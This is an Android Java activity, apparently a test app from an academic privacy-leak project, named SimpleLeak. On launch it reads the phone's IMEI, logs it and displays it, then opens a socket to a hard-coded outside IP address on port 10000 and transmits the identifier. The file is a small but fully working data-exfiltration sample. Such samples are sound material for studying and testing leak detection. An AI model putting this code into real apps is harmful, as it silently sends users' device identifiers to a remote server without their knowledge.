package edu.fandm.enovak.leaks;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class SimpleLeak extends AppCompatActivity {
    public final static String TAG = SimpleLeak.class.getName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_simple_leak);


        IMEI_LEAK(null);

    }

    public void IMEI_LEAK(View v){
        if (ContextCompat.checkSelfPermission(this ,
                Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED){
            Toast.makeText(this, "Phone state permissions required!", Toast.LENGTH_SHORT).show();
        } else {
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            final String IMEI = telephonyManager.getDeviceId();


            Log.d(TAG, IMEI);
            Toast.makeText(this, IMEI, Toast.LENGTH_SHORT).show();

            Thread t = new Thread(){

                public void run(){
                    try {
                        Socket s = new Socket("155.68.60.155", 10000);
                        OutputStreamWriter out = new OutputStreamWriter(s.getOutputStream());
                        out.write(IMEI, 0, IMEI.length());
                        out.flush(); // actually write / send

                        // we're done!
                        out.close();
                        s.close();

                    } catch (IOException ioe){
                        ioe.printStackTrace();

                    }
                }

            };
            t.start();

        }
    }
}
